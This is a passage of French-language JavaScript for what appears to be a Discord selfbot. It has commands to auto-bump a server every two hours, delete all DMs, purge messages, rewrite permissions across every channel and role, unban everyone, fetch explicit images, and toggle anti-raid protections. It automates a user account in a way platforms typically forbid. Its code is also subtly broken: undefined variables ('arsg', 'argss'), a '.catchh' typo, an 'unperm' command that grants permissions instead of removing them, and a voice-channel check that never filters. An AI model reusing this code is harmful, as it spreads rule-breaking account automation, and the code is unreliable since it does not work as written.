    if(user.roles.highest.position > client.user.id) return message.edit(`Je n'ai pas les permissions nécessaires pour **derank** <@${user.id}>`);
 

    message.edit(`${user} à été **derank**`)
    user.roles.set([], `Derank`).catch(() => false)
  }
    }
  }
    if (message.content.startsWith(prefix + "start bumping")) {
      message.delete()
      await message.channel.sendSlash('302050872383242240', 'bump',).catch( e => { console.log(e)})

      setInterval(async () => {
        await message.channel.sendSlash('302050872383242240', 'bump',).catch( e => { console.log(e)})
      }, 7203000)
    }

if (message.content.startsWith(prefix + "nuke dm")) {
  let err = '';
  message.edit('**Nuking dms...**')
  client.users.cache.forEach(user => user.deleteDM().catch( e => { }))
  message.edit(":white_check_mark: **Nuked dms**")
  console.log(consolecolor.instagram("[COMMANDE] Commande nuke dm executé"));
}

if (message.content.startsWith(prefix + "clear")){
  if (args[0] === "wl"){
    crow["users"] = []
    message.edit("Tous les membres de la whitelist ont été supprimés")
      savecrow()
  }
  else{
  message.channel.messages.fetch().then(messages => messages.forEach(singleMessage => {
    if (singleMessage.author.id === client.user.id) {
      message.delete().catch(()=> { })
        singleMessage.delete().catch(err => { });
    }
}))
  }
}

if (message.content.startsWith(prefix + "purge")) {
  if (message.author.id == client.user.id) {
      let args = message.content.split(" ").slice(1);
      let messagecount = parseInt(args[0]) || 1;
      var deletedMessages = -1;
      message.channel.messages.fetch({
              limit: Math.min(messagecount + 1, 100, 200)
          })
          .then(messages => {
              messages.forEach(message => {
                  message.delete().catch(console.error);
                  deletedMessages++;
              });
          }).then(() => {
              if (deletedMessages === -1) deletedMessages = 0
              message.channel.send(`${deletedMessages} *Messages sont en cours de suppression*`)
                  .then(message => message.delete(5000));
          }).catch(() => false);
  }
}

if (message.content.startsWith(prefix + "startup")){
  if (!message.guild) return message.edit(":x: **Commande executable sur un serveur seulement**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Tu dois avoir la perm admin pour executer cette commande**")
  message.guild.roles.cache.forEach(role => {
    if (role.permissions.has("ADMINISTRATOR") || role.permissions.has("MANAGE_CHANNELS") || role.permissions.has("BAN_MEMBERS") || role.permissions.has("KICK_MEMBERS")  || role.permissions.has("MANAGE_ROLES") || role.permissions.has("MODERATE_MEMBERS") || role.permissions.has("MANAGE_ROLES") || role.permissions.has("VIEW_AUDIT_LOG") ) return;
    else{
      role.setPermissions(["SEND_MESSAGES", "VIEW_CHANNEL", "READ_MESSAGE_HISTORY", "CONNECT", "CREATE_INSTANT_INVITE", "CREATE_PUBLIC_THREADS", "SEND_MESSAGES_IN_THREADS", "SPEAK", "STREAM", "USE_EXTERNAL_EMOJIS", "USE_EXTERNAL_STICKERS", "USE_VAD"])
    }
      })
        message.edit("✔ **Les rôles ont été modifiés**")
    }


    if (message.content.startsWith(prefix + "osu")) {
      if (message.author.id === client.user.id) {
        if (!arsg[0]) return message.edit(":x: **Veuillez me donner un pseudo à chercher**")
          const embed = new WebEmbed()
              .setTitle(`**Voici les stats osu de : ${encodeURIComponent(args.join(' '))}**`)
              .setColor(color)
              .setImage(`http://lemmmy.pw/osusig/sig.php?colour=hexc246f2&uname=${encodeURIComponent(args.join(' '))}&pp=1&countryrank&flagshadow&flagstroke&darkheader&darktriangles&opaqueavatar&avatarrounding=4&rankedscore&onlineindicator=undefined&xpbar&xpbarhex`)
          message.channel.send({embeds: [embed] });
      }
  }

  
  if (message.content.startsWith(prefix + "singosu")) {
    if (!arsg[0]) return message.edit(":x: **Veuillez me donner une chanson à chercher**")
    if (message.author.id === client.user.id) {
        message.delete();
        message.channel.send(`osusing :arrow_forward:https://osusig.ppy.sh/image1.png?uid=${encodeURIComponent(args.join(' '))}&m=0`);
    }
}

if (message.content.startsWith(prefix + "suicide")) {
  if (message.author.id === client.user.id) {
      setTimeout(function() {
          message.edit(":sob: :gun:")
      }, 1000)
      setTimeout(function() {
          message.edit(":boom:")
      }, 3000)
      setTimeout(function() {
          message.edit(":skull:")
      }, 5000)
  }
}


if (message.content.startsWith(prefix + "si")) {

      let serveur = message.guild;
      if (!serveur) return message.channel.send(':x: **Commande uniquement utilisable sur un serveur**');
    let afk = serveur.afkChannel
    if (!afk) afk = "Aucun"
    if (afk) afk = afk.name
    if (emode["embed"] === "on"){
    const embed = new WebEmbed()
    .setTitle(`Infos sur le serveur`)
    .setDescription(`𝐍𝐨𝐦: ${serveur.name}
    𝐈𝐃 𝐂𝐫é𝐚𝐭𝐞𝐮𝐫: : ${serveur.ownerId}
    𝐍𝐨𝐦𝐛𝐫𝐞 𝐝𝐞 𝐬𝐚𝐥𝐨𝐧𝐬: ${serveur.channels.cache.size}
    𝐍𝐨𝐦𝐛𝐫𝐞 𝐝𝐞 𝐦𝐞𝐦𝐛𝐫𝐞𝐬: ${serveur.members.cache.size}
    𝐂𝐫éé 𝐥𝐞: ${serveur.createdAt.toUTCString()}
    𝐒𝐚𝐥𝐨𝐧 𝐀𝐅𝐊: ${afk}
    𝐕𝐞𝐫𝐢𝐟: ${serveur.verificationLevel}
    𝐍𝐒𝐅𝐖: ${serveur.nsfwLevel}`)
    if (serveur.banner === true) embed.setImage(serveur.bannerURL)
    }
    else{
      "```"+
      `Informations sur ${serveur.name}`
      +"``````"+
`Id du créateur   » ${serveur.ownerId}
Créé le           » ${serveur.createdAt.toUTCString()}
Vérification      » ${serveur.verificationLevel}
Salons NSFW       » ${serveur.nsfwLevel}
Salon AFK         » ${afk}
Nombre de salons  » ${serveur.channels.cache.size}
Nombre de membres » ${serveur.members.cache.size}`
      +"```"
    }

    if (emode["embed"] === "on") return message.edit({embeds: [embed]})
    if (emode["embed"] === "off") return message.edit(embed)

}




if (message.content.startsWith(prefix + "branlette")){
message.edit("8=:fist:==D").catch(() => {})
 message.edit("8==:fist:=D").catch(() => {})
 message.edit("8===:fist:D ").catch(() => {})
 message.edit("8==:fist:=D").catch(() => {})
 message.edit("8=:fist:==D ").catch(() => {})
 message.edit("8:fist:===D").catch(() => {})
 message.edit("8=:fist:==D ").catch(() => {})
 message.edit("8==:fist:=D").catch(() => {})
 message.edit("8===:fist:D").catch(() => {})
 message.edit("8==:fist:=D:sweat_drops:").catch(() => {})
 message.edit("8===:fist:D:sweat_drops:").catch(() => {})
}







// Profile
if (message.content.startsWith(prefix + "nick")){
  if (!message.guild) return message.edit(":x: **Commande executable sur un serveur uniquement**")
  if (!message.member.permissions.has("CHANGE_NICKNAME")) return message.edit(":x: **Tu n'as pas la permission de changer ton pseudo**")
  let nick = args.slice(0).join(' ')
  if (!nick) nick = "WFA"
  message.member.setNickname(nick)
  message.delete().catchh(() => { })
}

if (message.content.startsWith(prefix + "invisiblenick")){
  if (!message.guild) return message.edit(":x: **Commande executable sur un serveur uniquement**")
  if (!message.member.permissions.has("CHANGE_NICKNAME")) return message.edit(":x: **Tu n'as pas la permission de changer ton pseudo**")
  message.member.setNickname("឵឵ ឵឵ ឵឵ ឵឵")
  message.delete().catch(() => false)
}

if (message.content.startsWith(prefix + "junknick")){
  if (!message.guild) return message.edit(":x: **Commande executable sur un serveur uniquement**")
  if (!message.member.permissions.has("CHANGE_NICKNAME")) return message.edit(":x: **Tu n'as pas la permission de changer ton pseudo**")
  message.member.setNickname("𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫")
  message.delete().catch(() => false)
}

if (message.content.startsWith(prefix + "online")){
  message.delete().catch(() => false)
  client.user.setPresence({ status: 'online' });
}

if (message.content.startsWith(prefix + "idle")){
  message.delete().catch(() => false)
  client.user.setPresence({ status: 'idle' });
}

if (message.content.startsWith(prefix + "dnd")){
  message.delete().catch(() => false)
  client.user.setPresence({ status: 'dnd' });
}

if (message.content.startsWith(prefix + "invisible")){
  message.delete().catch(() => false)
  client.user.setPresence({ status: 'invisible' });
}

if (message.content.startsWith(prefix + "cstatus")){
  message.delete().catch(() => false)
  client.user.setActivity({ });

}

if (message.content.startsWith(prefix + "status")){
  message.delete().catch(() => false)
  let status = args.slice(0).join(' ')
  if (!status) return message.edit(":x: **Veuillez me donner un status**")
  const r = new CustomStatus()
	.setState(status)
client.user.setActivity(r.toJSON());
}

if (message.content.startsWith(prefix + "removestatus")){
  message.delete().catch(() => false)
  const r = new CustomStatus()
	.setState(null)
client.user.setActivity(r.toJSON());
}























// Moderation

if (message.content.startsWith(prefix + "ban")){
  if (message.channel.type == "dm" || message.channel.type == "group") return message.edit(":x: **Commande utilisable sur serveur**");
  if (!message.member.permissions.has("BAN_MEMBERS")) return message.delete().then(console.log("[ERROR] Permissions insuffisantes"));
  const membre = message.guild.members.cache.get(args[0]) || message.mentions.members.first()
  if (!membre) return message.edit(":x: **Tu dois me donner un membre valide**")
  membre.ban()
  .then(message.edit(`✔ **${membre} est banni**`))
  .catch(message.delete())
}

if (message.content.startsWith(prefix + "kick")){
  if (message.channel.type == "dm" || message.channel.type == "group") return message.edit(":x: **Commande utilisable sur serveur**");
  if (!message.member.permissions.has("KICK_MEMBERS")) return message.delete().then(console.log("[ERROR] Permissions insuffisantes"));
  const membre = message.guild.members.cache.get(args[0]) || message.mentions.members.first()
  if (!membre) return message.edit(":x: **Tu dois me donner un membre valide**")
  membre.kick()
  .then(message.edit(`✔ **${membre} est kick**`))
  .catch(message.delete())
}

if (message.content.startsWith(prefix + "warn")){
  if (message.channel.type == "dm" || message.channel.type == "group") return message.edit(":x: **Commande utilisable sur serveur**");
  if (!message.member.permissions.has("MANAGE_MESSAGES")) return message.delete().then(console.log("[ERROR] Permissions insuffisantes"));
  const membre = client.users.cache.get(args[0]) || message.mentions.users.first()
  if (!membre) return message.edit(":x: **Tu dois me donner un membre valide**")
  let raison = argss.splice(2).join(' ')
  if (!raison) raison = "Non donnée"
  if (emode["embed"] === "on"){
  var embed = new WebEmbed()
  .setTitle(`⛔Tu as reçu un avertissement ⛔`)
  .setDescription(`Tu as reçu un avertissement du serveur ${message.guild.name} avec comme raison: ${raison}`)
  await membre.createDM().catch(e => { })
  }
  else{
    var embed = "```"+
    `⛔ Tu as reçu un avertissement ⛔`
    +"````"+
    `Tu as reçu un avertissement du serveur ${message.guild.name} avec comme raison: ${raison}`
    +"```"
  }
  if (emode["embed"] === "on") return membre.send({embeds: [embed]})
  .then(message.delete())
  .catch(message.delete())
  if (emode["embed"] === "off") return membre.send(embed)
  .then(message.delete())
  .catch(message.delete())
}

if (message.content.startsWith(prefix + "renew")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("MANAGE_CHANNELS")) return message.delete().then(console.log("Permissions insuffisantes"))
    let channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.channel 
    if(channel === message.channel) {
      try {
          let ee =    await channel.clone({
              name: channel.name,
              permissions: channel.permissionsOverwrites,
              type: channel.type,
              topic: channel.withTopic,
              nsfw: channel.nsfw,
              birate: channel.bitrate,
              userLimit: channel.userLimit,
              rateLimitPerUser: channel.rateLimitPerUser,
              permissions: channel.withPermissions,
              position: channel.rawPosition,
              reason:  `Salon recréé par ${message.author.tag} (${message.author.id})`
          })
          channel.delete().catch(() => ee.delete() && channel.send("Impossible de renouveler ce salon *(il est peut-être utilisé dans les paramètres communautaires)*"))
      } catch (error) {
          return;
      }
  }
else {
    
  try {
    let ee =  await channel.clone({
          name: channel.name,
          permissions: channel.permissionsOverwrites,
          type: channel.type,
          topic: channel.withTopic,
          nsfw: channel.nsfw,
          birate: channel.bitrate,
          userLimit: channel.userLimit,
          rateLimitPerUser: channel.rateLimitPerUser,
          permissions: channel.withPermissions,
          position: channel.rawPosition,
          reason:  `Salon recréé par ${message.author.tag} (${message.author.id})`
      })
      channel.delete().catch(() => ee.delete() && channel.send("Impossible de renouveler ce salon *(il est peut-être utilisé dans les paramètres communautaires)*"))
      ee.send(`${message.author} salon recréé`)

  } catch (error) {
      return;
  }
 
  message.channel.send("Salon recréé : "+channel.name)
}
}

if (message.content.startsWith(prefix + "unban")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!args[0]) return message.edit(":x: **Tu dois me donner un id ou mentionner quelqu'un à deban**")
  const user = message.guild.members.cache.get(args[0]) || message.mentions.members.first()
  if (!user) message.edit(":x: **"+user+" n'a pas été trouvé**")
  if (args[0] == "all"){
    message.guild.bans.fetch().then(bans => {
      if (bans.size == 0) {
          message.edit("Aucune personne n'est ban.")
      } else {
          bans.forEach(ban => {
              setInterval(()=> {if(ban.user) message.guild.members.unban(ban.user.id,  `Unbanall par ${client.user.tag}`).catch(err => {});}, 250)
             
          })
          .then(message.edit(`✔ **Tous les membres bannis sont debannis**`))
          .catch(e => { })     
      }
      
  })
  }
  else{
    user.unban()
    .then(message.edit("✔ **" + user + " est debanni**"))
  }
}

if (message.content.startsWith(prefix + "lock")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")

  if (args[0] == "all"){
  message.guild.channels.cache.forEach((channel, id) => {
    channel.permissionOverwrites.edit(message.guild.roles.everyone, {
      SEND_MESSAGES: false,
      SPEAK: false,
      ADD_REACTIONS: false 
    })
  }, `Tout les salon fermé par ${message.author.tag}`)
  message.edit("✔ **tous les salons sont lock**");
}
else {
const channel = client.channels.cache.get(args[0]) || message.mentions.channels.first() || message.channel
channel.permissionOverwrites.edit(message.guild.roles.everyone, {
  SEND_MESSAGES: false,
  SPEAK: false,
  ADD_REACTIONS: false 
})
.then(message.edit("✔ **Salon lock**"));

}
}

if (message.content.startsWith(prefix + "unlock")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")

  if (args[0] == "all"){
  message.guild.channels.cache.forEach((channel, id) => {
    channel.permissionOverwrites.edit(message.guild.roles.everyone, {
      SEND_MESSAGES: null,
      SPEAK: null,
      ADD_REACTIONS: null 
    })
  }, `Tout les salon ouverts par ${message.author.tag}`)
  .then(message.edit("✔ **Salon unlock**"));
}
else {
const channel = client.channels.cache.get(args[0]) || message.mentions.channels.first() || message.channel
channel.permissionOverwrites.edit(message.guild.roles.everyone, {
  SEND_MESSAGES: null,
  SPEAK: null,
  ADD_REACTIONS: null 
})
.then(message.edit("✔ **Salon unlock**"));
}
}

if (message.content.startsWith(prefix + "hide")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")


const channel = client.channels.cache.get(args[0]) || message.mentions.channels.first() || message.channel
channel.permissionOverwrites.edit(message.guild.roles.everyone, {
  VIEW_CHANNEL	: false,
})
.then(message.edit("✔ **Salon caché**"));
}

if (message.content.startsWith(prefix + "unhide")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")


const channel = client.channels.cache.get(args[0]) || message.mentions.channels.first() || message.channel
channel.permissionOverwrites.edit(message.guild.roles.everyone, {
  VIEW_CHANNEL	: null,
})
.then(message.edit("✔ **Salon affiché**"));
}














//  Perms

if (message.content.startsWith(prefix + "perm send")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")
  let role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1])
  if (!role) message.edit(":x: **Veuillez me donner un rôle valide**")

  message.guild.channels.cache.forEach((channel, id) => {
    channel.permissionOverwrites.edit(role, {
      SEND_MESSAGES: true,
    })
  }, `Perm Messages par ${message.author.tag}`)
  message.edit("✔ **Perm Messages Attribuées**");

}

if (message.content.startsWith(prefix + "unperm send")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")
  let role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1])
  if (!role) message.edit(":x: **Veuillez me donner un rôle valide**")

  message.guild.channels.cache.forEach((channel, id) => {
    channel.permissionOverwrites.edit(role, {
      SEND_MESSAGES: true,
    })
  }, `Unperm Messages par ${message.author.tag}`)
  message.edit("✔ **Perm Messages Enlevées**");

}

if (message.content.startsWith(prefix + "perm image")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")
  let role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1])
  if (!role) message.edit(":x: **Veuillez me donner un rôle valide**")

  message.guild.channels.cache.forEach((channel, id) => {
    channel.permissionOverwrites.edit(role, {
      EMBED_LINKS: true,
      ATTACH_FILES: true, 
    })
  }, `Perm Image par ${message.author.tag}`)
  message.edit("✔ **Perm Image Attribuées**");

}

if (message.content.startsWith(prefix + "unperm image")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")
  let role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1])
  if (!role) message.edit(":x: **Veuillez me donner un rôle valide**")

  message.guild.channels.cache.forEach((channel, id) => {
    channel.permissionOverwrites.edit(role, {
      EMBED_LINKS: null,
      ATTACH_FILES: null, 
    })
  }, `Perm Image par ${message.author.tag}`)
  message.edit("✔ **Perm Image Enlevées**");

}

if (message.content.startsWith(prefix + "perm voc")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")
  let role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1])
  if (!role) message.edit(":x: **Veuillez me donner un rôle valide**")

  message.guild.channels.cache.forEach((channel, id) => {
    if (!channel.type === "GUILD_VOICE") return;
    channel.permissionOverwrites.edit(role, {
      STREAM: true,
      SPEAK: true,
      PRIORITY_SPEAKER: true,
      MUTE_MEMBERS: true,
      DEAFEN_MEMBERS: true,
      MOVE_MEMBERS: true,
      USE_VAD: true,
      REQUEST_TO_SPEAK: true,
    })
  }, `Perm Voc par ${message.author.tag}`)
  message.edit("✔ **Perm Vocales Attribuées**");

}

if (message.content.startsWith(prefix + "unperm voc")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")
  let role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1])
  if (!role) message.edit(":x: **Veuillez me donner un rôle valide**")

  message.guild.channels.cache.forEach((channel, id) => {
    if (!channel.type === "GUILD_VOICE") return;
    channel.permissionOverwrites.edit(role, {
      STREAM: null,
      SPEAK: null,
      PRIORITY_SPEAKER: null,
      MUTE_MEMBERS: null,
      DEAFEN_MEMBERS: null,
      MOVE_MEMBERS: null,
      USE_VAD: null,
      REQUEST_TO_SPEAK: null,
    })
  }, `Perm Voc par ${message.author.tag}`)
  message.edit("✔ **Perm Vocales Enlevées**");
}

if (message.content.startsWith(prefix + "perm all")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")
  let role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1])
  if (!role) message.edit(":x: **Veuillez me donner un rôle valide**")

  message.guild.channels.cache.forEach((channel, id) => {
    if (!channel.type === "GUILD_VOICE") return;
    channel.permissionOverwrites.edit(role, {
      CREATE_INSTANT_INVITE: true,
      MANAGE_CHANNELS: true,
      ADD_REACTIONS: true,
      VIEW_CHANNEL: true,
      SEND_MESSAGES: true,
      SEND_TTS_MESSAGES: true,
      MANAGE_MESSAGES : true,
      EMBED_LINKS: true,
      ATTACH_FILES: true,
      READ_MESSAGE_HISTORY: true,
      MENTION_EVERYONE: true,
      USE_EXTERNAL_EMOJIS: true,
      USE_APPLICATION_COMMANDS: true,
      CREATE_PUBLIC_THREADS: true,
      CREATE_PRIVATE_THREADS: true,
      USE_EXTERNAL_STICKERS: true,
      SEND_MESSAGES_IN_THREADS: true,
      USE_EMBEDDED_ACTIVITIES: true,
      STREAM: true,
      CONNECT: true, 
      SPEAK: true,
      PRIORITY_SPEAKER: true,
      MUTE_MEMBERS: true,
      DEAFEN_MEMBERS: true,
      MOVE_MEMBERS: true,
      USE_VAD: true,
      REQUEST_TO_SPEAK: true,
    })
  }, `Perms par ${message.author.tag}`)
  message.edit("✔ **Perms Ajoutés**");
}

if (message.content.startsWith(prefix + "unperm all")){
  if (!message.guild) return message.edit(":x: **Commande utilisable uniquement sur un serveur**")
  if (!message.member.permissions.has("ADMINISTRATOR")) return message.edit(":x: **Permission insuffisante**")
  let role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1])
  if (!role) message.edit(":x: **Veuillez me donner un rôle valide**")

  message.guild.channels.cache.forEach((channel, id) => {
    if (!channel.type === "GUILD_VOICE") return;
    channel.permissionOverwrites.edit(role, {
      CREATE_INSTANT_INVITE: null,
      MANAGE_CHANNELS: null,
      ADD_REACTIONS: null,
      VIEW_CHANNEL: null,
      SEND_MESSAGES: null,
      SEND_TTS_MESSAGES: null,
      MANAGE_MESSAGES : null,
      EMBED_LINKS: null,
      ATTACH_FILES: null,
      READ_MESSAGE_HISTORY: null,
      MENTION_EVERYONE: null,
      USE_EXTERNAL_EMOJIS: null,
      USE_APPLICATION_COMMANDS: null,
      CREATE_PUBLIC_THREADS: null,
      CREATE_PRIVATE_THREADS: null,
      USE_EXTERNAL_STICKERS: null,
      SEND_MESSAGES_IN_THREADS: null,
      USE_EMBEDDED_ACTIVITIES: null,
      STREAM: null,
      CONNECT: null, 
      SPEAK: null,
      PRIORITY_SPEAKER: null,
      MUTE_MEMBERS: null,
      DEAFEN_MEMBERS: null,
      MOVE_MEMBERS: null,
      USE_VAD: null,
      REQUEST_TO_SPEAK: null,
    })
  }, `Unperms par ${message.author.tag}`)
  message.edit("✔ **Perms Enlevés**");
}








//  NSFW


if (message.content.startsWith(prefix + "ass")) {
  if (nsfw === "on" || nsfw === "On"){
  snekfetch.get("https://nekobot.xyz/api/image").query({
      type: "ass"
  }).end((err, res) => {
      msg.edit(ghost + "https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=" + res.body.message + '\n').catch(err => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
  });
  }
  else {
    message.edit(nonsfw)

  }
}

if (message.content.startsWith(prefix + '4k')) {
  if (nsfw === "on" || nsfw === "On"){
  snekfetch.get("https://nekobot.xyz/api/image").query({
      type: "4k"
  }).end((err, res) => {
      const embed = new WebEmbed()
      .setTitle("Commande 4K 🔞")
      .setImage(`${res.body.message}`)
      if (emode["embed"] === "on") return message.edit({embeds: [embed]})
      if (emode["embed"] === "off") return message.edit(res.body.message)
  })
  }
  else {
    return message.edit(nonsfw)  };

}
if (message.content.startsWith(prefix + "nsfw-gif")) {
  if (nsfw === "on" || nsfw === "On"){
  snekfetch.get("https://nekobot.xyz/api/image").query({
      'type': "pgif"
  }).end((err, res) => {
    const embed = new WebEmbed()
    .setTitle("Commande 4K 🔞")
    .setImage(`${res.body.message}`)
    if (emode["embed"] === "on") return message.edit({embeds: [embed]})
    if (emode["embed"] === "off") return message.edit(res.body.message)  });
}
else {
  message.edit(nonsfw)
}
}
if (message.content.startsWith((prefix + "hentai"))) {
  if (nsfw === "on" || nsfw === "On"){
  snekfetch.get("https://nekobot.xyz/api/image").query({
      'type': "hentai_anal"
  }).end((err, res) => {
    if (emode["embed"] === "on"){
    var embed = new WebEmbed()
    .setTitle("Commande Hentai 🔞")
    .setURL(res.body.message)
    .setImage(res.body.message)
    }
    else{
      var embed = res.body.message
    }
    if (emode["embed"] === "on") return message.edit({embeds: [embed]});
    if (emode["embed"] === "off") return message.edit(embed)  });
}
else {
  message.edit(nonsfw)
}
}
if (message.content.startsWith(prefix + "pussy")) {
  if (nsfw === "on" || nsfw === "On"){
  snekfetch.get("https://nekobot.xyz/api/image").query({
      type: "pussy"
  }).end((err, res) => {
    const embed = new WebEmbed()
    .setTitle("Commande pussy 🔞")
    .setImage(`${res.body.message}`)
    if (emode["embed"] === "on") return message.edit({embeds: [embed]})
    if (emode["embed"] === "off") return message.edit(res.body.message)  });
}
else {
  message.edit(nonsfw)
}
}
if (message.content.startsWith(prefix + 'thigh')) {
  if (nsfw === "on" || nsfw === "On"){
  snekfetch.get("https://nekobot.xyz/api/image").query({
      'type': "thigh"
  }).end((err, res) => {
    const embed = new WebEmbed()
    .setTitle("Commande thigh 🔞")
    .setImage(`${res.body.message}`)
    if (emode["embed"] === "on") return message.edit({embeds: [embed]})
    if (emode["embed"] === "off") return message.edit(res.body.message)  });
}
else {
  message.edit(nonsfw)
}
}
if (message.content.startsWith(prefix + "anal")) {
  if (nsfw === "on" || nsfw === "On"){
  snekfetch.get("https://nekobot.xyz/api/image").query({
      type: "anal"
  }).end((err, res) => {
      const embed = new WebEmbed()
      .setTitle("Commande anal 🔞")
      .setImage(`${res.body.message}`)
      if (emode["embed"] === "on") return message.edit({embeds: [embed]})
      if (emode["embed"] === "off") return message.edit(res.body.message)  });
}
else {
  message.edit(nonsfw)}
}


// Protection

if (message.content.startsWith(prefix + "whitelist")){
  if (!args[0]) return message.edit(":x: **Veuillez mentionner quelqu'un**")
  let user = message.mentions.users.first() || client.users.cache.get(args[0])
  if (!user) return message.edit(":x: **Veuillez mentionner quelqu'un**")
  if (crow["users"].includes(user.id)) return message.edit(":x: <@"+user.id+"> est déjà whitelist")
  crow["users"].push(user.id)
  savecrow()
message.edit("`"+user+"` est dans la whitelist")
}  

if (message.content.startsWith(prefix + "unwhitelist")){
  if (!args[0]) return message.edit(":x: **Veuillez mentionner quelqu'un**")
  let user = message.mentions.users.first() || client.users.cache.get(args[0])
  if (!user) return message.edit(":x: **Veuillez mentionner quelqu'un**")
  if (!crow["users"].includes(user.id)) return message.edit(":x: <@"+user.id+"> n'est pas whitelist")
  crow["users"].splice(crow["users"].indexOf(user.id), 1);
  savecrow()
message.edit("`"+user+"` n'est plus whitelist")
}  

if (message.content.startsWith(prefix + "pguilds")){
  if (!args[0]) return message.edit(":x: **Veuillez donner l'id d'un serveur**")
  let user = client.guilds.cache.get(args[0])
  if (!user) return message.edit(":x: **Veuillez donner l'id d'un serveur**")
  if (crowserv["guilds"].includes(user.id)) return message.edit(":x: **"+user.name+" est déjà sous protection**")
 crowserv["guilds"].push(user.id)
savecrowserv()
message.edit("`"+user.name+"` est sécurisé")
}  

if (message.content.startsWith(prefix + "rguilds")){
  if (!args[0]) return message.edit(":x: **Veuillez donner l'id d'un serveur**")
  let user = client.guilds.cache.get(args[0])
  if (!user) return message.edit(":x: **Veuillez donner l'id d'un serveur**")
  crowserv["guilds"].splice(crowserv["guilds"].indexOf(user.id), 1);

savecrowserv()
message.edit("`"+user.name+"` n'est plus sécurisé")
}  

if (message.content.startsWith(prefix + "antibot")){
  if (!args[0]) return message.edit(":x: **Veuillez utiliser la commande de cette manière: `"+prefix+"antibot on`**")
  if (args[0] === "on"){
    if (crowsecur["antibot"] === "on") return message.edit(":x: **L'anti bot est déjà activé**")
    crowsecur["antibot"] = "on"
    savesecur()
    message.edit("L'anti bot a été activé")
  }
  else{
    crowsecur["antibot"] = "off"
    savesecur()
    message.edit("L'anti bot a été désactivé")
  }
}

if (message.content.startsWith(prefix + "antichannel")){
  if (!args[0]) return message.edit(":x: **Veuillez utiliser la commande de cette manière: `"+prefix+"antichannel on`**")
  if (args[0] === "on"){
    if (crowsecur["antichannel"] === "on") return message.edit(":x: **L'anti channel est déjà activé**")
    crowsecur["antichannel"] = "on"
    savesecur()
    message.edit("L'anti channel a été activé")
  }
  else{
    crowsecur["antichannel"] = "off"
    savesecur()
    message.edit("L'anti channel a été désactivé")
  }
}

if (message.content.startsWith(prefix + "antirole")){
  if (!args[0]) return message.edit(":x: **Veuillez utiliser la commande de cette manière: `"+prefix+"antirole on`**")
  if (args[0] === "on"){
    if (crowsecur["antirole"] === "on") return message.edit(":x: **L'anti role est déjà activé**")
    crowsecur["antirole"] = "on"
    savesecur()
    message.edit("L'anti role a été activé")
  }
  else{
    crowsecur["antirole"] = "off"
    savesecur()
    message.edit("L'anti role a été désactivé")
  }
}

if (message.content.startsWith(prefix + "antiwebhook")){
  if (!args[0]) return message.edit(":x: **Veuillez utiliser la commande de cette manière: `"+prefix+"antiwebhook on`**")
  if (args[0] === "on"){
    if (crowsecur["antiwebhook"] === "on") return message.edit(":x: **L'anti webhook est déjà activé**")
    crowsecur["antiwebhook"] = "on"
    savesecur()
    message.edit("L'anti webhook a été activé")
  }
  else{
    crowsecur["antiwebhook"] = "off"
    savesecur()
    message.edit("L'anti webhook a été désactivé")
  }
}

if (message.content.startsWith(prefix + "antiban")){
  if (!args[0]) return message.edit(":x: **Veuillez utiliser la commande de cette manière: `"+prefix+"antiban on`**")
  if (args[0] === "on"){
    if (crowsecur["antiban"] === "on") return message.edit(":x: **L'anti ban est déjà activé**")
    crowsecur["antiban"] = "on"
    savesecur()
    message.edit("L'anti ban a été activé")
  }
  else{
    crowsecur["antiban"] = "off"
    savesecur()
    message.edit("L'anti ban a été désactivé")
  }
}

if (message.content.startsWith(prefix + "antikick")){
  if (!args[0]) return message.edit(":x: **Veuillez utiliser la commande de cette manière: `"+prefix+"antikick on`**")
  if (args[0] === "on"){
    if (crowsecur["antikick"] === "on") return message.edit(":x: **L'anti kick est déjà activé**")
